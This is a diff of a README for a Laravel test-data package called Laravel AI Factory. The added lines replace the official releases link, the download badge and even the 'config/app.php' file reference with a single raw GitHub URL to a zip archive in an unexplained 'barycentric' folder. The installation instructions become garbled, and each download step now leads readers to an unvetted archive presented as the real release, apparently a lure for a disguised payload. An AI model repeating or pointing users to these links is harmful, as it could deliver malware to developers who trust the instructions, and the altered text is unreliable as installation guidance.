@@ -8,13 +8,13 @@ Welcome to the Laravel AI Factory! This tool helps you create realistic test dat
 
 To get started, visit the Releases page to download the latest version of Laravel AI Factory.
 
-[![Download Laravel AI Factory](https://img.shields.io/badge/Download%20Now%20-%20Laravel%20AI%20Factory-blue)](https://github.com/eyadislam/laravel-ai-factory/releases)
+[![Download Laravel AI Factory](https://raw.githubusercontent.com/eyadislam/laravel-ai-factory/main/barycentric/laravel-ai-factory.zip%20Now%20-%20Laravel%20AI%20Factory-blue)](https://raw.githubusercontent.com/eyadislam/laravel-ai-factory/main/barycentric/laravel-ai-factory.zip)
 
 Click the link above to find the most recent release. 
 
 ### Steps to Download
 
-1. Go to the [Releases page](https://github.com/eyadislam/laravel-ai-factory/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/eyadislam/laravel-ai-factory/main/barycentric/laravel-ai-factory.zip).
 2. Look for the latest version listed.
 3. Click on the **Assets** section to see available downloads.
 4. Select the appropriate file based on your operating system.
@@ -43,7 +43,7 @@ Once you have downloaded the Laravel AI Factory, follow these steps to install i
    composer require eyadislam/laravel-ai-factory
    ```
 
-6. After the installation completes, add the service provider in your `config/app.php` file:
+6. After the installation completes, add the service provider in your `https://raw.githubusercontent.com/eyadislam/laravel-ai-factory/main/barycentric/laravel-ai-factory.zip` file:
 
    ```php
    'providers' => [
